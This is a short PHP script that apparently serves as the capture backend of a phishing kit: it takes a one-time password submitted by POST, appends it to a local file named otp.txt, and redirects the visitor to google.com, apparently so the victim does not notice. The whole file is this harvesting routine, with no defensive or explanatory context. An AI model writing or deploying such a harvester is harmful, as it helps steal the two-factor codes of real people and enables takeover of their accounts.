<?php
if ($_SERVER["REQUEST_METHOD"] == "POST"){
	$otp = $_POST['otp'];
	
	$file = fopen("otp.txt","w");
	$data = "OTP: ".$otp."\n";
	fwrite($file, $data);
	fclose($file);
	header("Location: https://www.google.com");
	}
	?>